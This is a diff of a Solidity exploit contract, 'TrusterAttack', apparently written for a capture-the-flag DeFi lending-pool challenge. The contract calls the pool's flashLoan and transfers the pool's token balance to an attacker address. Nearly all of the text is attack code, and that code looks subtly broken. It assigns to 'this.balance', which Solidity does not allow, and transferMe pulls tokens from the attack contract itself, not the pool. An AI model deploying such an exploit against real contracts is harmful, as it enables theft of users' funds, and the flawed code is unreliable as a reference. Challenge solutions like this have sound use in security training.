@@ -25,7 +25,7 @@ contract TrusterAttack {
 
         //call flashLoan with x borrowAmount, borrower = this
         //target = token 
-        this.balance = IERC20(tokenAddress).balanceOf(poolAddress);
+        this.balance = uint256(IERC20(tokenAddress).balanceOf(poolAddress));
         IPoolFunc(poolAddress).flashLoan(
             0,
             address(this),
@@ -42,7 +42,7 @@ contract TrusterAttack {
         //token.tranfser(amount,attacker)
         //
     }
-    function transferMe(address tokenAddress, address attackerAddress) external{
+    function transferMe(address tokenAddress, address attackerAddress) public{
         IERC20(tokenAddress).transfer(attackerAddress, this.balance);
     }
 
